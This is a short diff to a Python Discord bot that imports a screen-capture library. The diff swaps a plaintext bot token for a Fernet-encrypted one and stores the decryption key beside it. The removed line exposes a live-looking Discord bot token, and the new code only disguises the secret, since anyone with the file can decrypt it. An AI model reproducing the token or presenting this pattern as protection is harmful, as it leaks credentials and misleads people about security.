@@ -5,9 +5,21 @@ from discord.ext import commands
 from PIL import ImageGrab
 import io
 import platform
+from cryptography.fernet import Fernet
+
+# Decrypting the token
+
+# Replace with the encryption key you generated (it must be a bytes object)
+key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
+cipher_suite = Fernet(key)
+
+# Replace with the encrypted token you generated
+encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token
+
+# Decrypt the token
+TOKEN = cipher_suite.decrypt(encrypted_token).decode()
 
 # Set up the bot
-TOKEN = "MTQxMjgyNDg0OTg1NjA2OTYzNA.GmHwMD.hw4T0qRU8ldwsoNpnqwPkdEX-Oo17yI-eguROA"  # Replace with your Discord bot token
 GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
 intents = discord.Intents.default()
 intents.message_content = True
